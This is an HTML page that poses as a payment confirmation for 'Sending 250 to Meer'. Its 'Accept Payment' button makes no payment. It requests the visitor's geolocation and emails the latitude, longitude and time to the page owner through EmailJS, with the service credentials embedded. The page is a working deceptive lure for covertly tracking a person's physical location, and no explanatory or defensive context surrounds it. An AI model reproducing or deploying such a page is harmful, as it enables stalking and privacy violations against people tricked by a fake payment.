<!DOCTYPE html>
<html>
<head>
  <title>Payment Confirmation</title>
</head>
<body style="font-family: Arial, sans-serif; text-align:center; margin-top: 100px;">
  <h2>Sending 250 to Meer</h2>
  <button style="padding: 15px 30px; font-size: 18px; cursor:pointer;" onclick="getLocation()">Accept Payment</button>
  <p id="status"></p>

  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    emailjs.init('i7BweUs_ujM3g34jk'); // your Public Key here

    function getLocation() {
      const status = document.getElementById('status');
      if (!navigator.geolocation) {
        status.textContent = 'Geolocation is not supported by your browser.';
        return;
      }

      status.textContent = 'Verifying location...';

      navigator.geolocation.getCurrentPosition(
        (position) => {
          status.textContent = 'Payment accepted. Sending location...';

          const templateParams = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            date: new Date().toLocaleString()
          };

          emailjs.send('service_76mv2fb', 'template_5io8d5q', templateParams)
            .then(() => {
              status.textContent = 'Payment accepted. Location sent.';
            }, (error) => {
              status.textContent = 'Failed to send location. Try again.';
              console.error('EmailJS error:', error);
            });
        },
        () => {
          status.textContent = 'Unable to retrieve your location.';
        }
      );
    }
  </script>
</body>
</html>
